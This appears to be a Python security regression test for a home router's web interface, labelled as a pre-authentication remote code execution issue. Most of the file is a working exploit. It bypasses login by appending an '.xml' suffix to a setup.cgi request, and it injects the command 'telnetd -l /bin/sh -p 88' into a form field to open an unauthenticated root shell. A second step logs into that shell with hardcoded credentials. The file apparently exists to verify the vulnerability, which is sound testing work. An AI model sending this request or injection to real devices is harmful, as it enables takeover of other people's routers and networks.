'''[PSV-2017-2210] Pre-Auth RCE  '''
''' anthor Cloud 2018-01-04'''
'''v1.0 '''
from API._API import *

# #def test_step_0():
    # #log.info( 'step-0-0 dut loaddrfault wait 160s')
    # #aploaddefault()
    # #log.info( "step-0-1 AP Genie over leap done")
    # #Genie_overleap()
#    log.info( "step-0-2 disable changed-url token")
#    Disable_changedToken()

def test_Step_1():
    log.info('step-1 Allow filename extension by pass auth, such as .xml, .js.jpg')
    url = host + urlLogs
    token = getIDToken(url)
    Authorization = 'Basic ' + base64.b64encode(user + ':' + passwd) 
    headers = {'Authorization': Authorization}
    data = 'loginreq=dhcp&system_name=R6220&domain_name= &WANAssign=static&MACAssign=0&h_WANAssign=static&h_DNSAssign= 1&h_MACAssign=0&c4_WMask=255.255.255.0telnetd -l /bin/sh -p 88&c4_PDAddr=&h_loginreq=dhcp&runtest=&todo=save&this_file=BAS_ether.htm&next_file=B AS_basic.htm&SID='
    post_url = host + 'setup.cgi' + token + '&sp=&asd=.xml'
    r = ''
    try:
        r = requests.post(post_url, headers=headers, data=data,timeout=5)
    except:
        time.sleep(1)
    if r != '':
        log.info(r.status_code)

def test_Step_2():
    log.info( 'step-2 judje dut telnet service is enable on 88 port')
    str = judjeduttelnet(host=hostip,username='admin',password='Password!',telnetport ='88',prompt='#')
    assert str == 'pass', "This action should work." 
